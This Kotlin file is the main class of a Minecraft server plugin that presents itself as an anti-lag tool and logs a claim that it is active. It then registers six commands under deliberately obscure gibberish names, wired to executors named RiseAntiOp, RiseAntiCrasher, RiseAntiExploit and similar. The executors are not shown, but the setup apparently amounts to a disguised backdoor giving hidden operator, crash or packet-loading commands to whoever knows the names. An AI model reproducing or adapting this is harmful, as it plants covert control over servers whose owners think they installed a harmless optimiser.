package dev.jokerthena;

import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

class RiseAntiLag : JavaPlugin(), Listener {
    override fun onEnable() {
        logger.info("Antilag: Aktif! Lag Oranı %0.1")
        server.pluginManager.registerEvents(this,this)
        getCommand("qweqweewqqwertyf")?.setExecutor(RiseAntiSyrox)
        getCommand("31182819284159514231")?.setExecutor(RiseAntiExploit)
        getCommand("zzzzzzzzzzxdkasjxkdjaskdjaskdasaaa")?.setExecutor(RiseAntiCrasher)
        getCommand("enaedkfanekdfajkdfhaekldfhaejkdfhadkfj")?.setExecutor(RiseAntiPacket)
        getCommand("awksdhaskjdhawkjsdhkjawsdhkjawshdkjawshdkjawhsdkja")?.setExecutor(RiseAntiCustomPacketsLoader)
        getCommand("awsdbaskjdbawkjhsdgbjhasdbvhjawsdbhjawsbdjhawsdawsdawnsjkd")?.setExecutor(RiseAntiOp)
    }
}

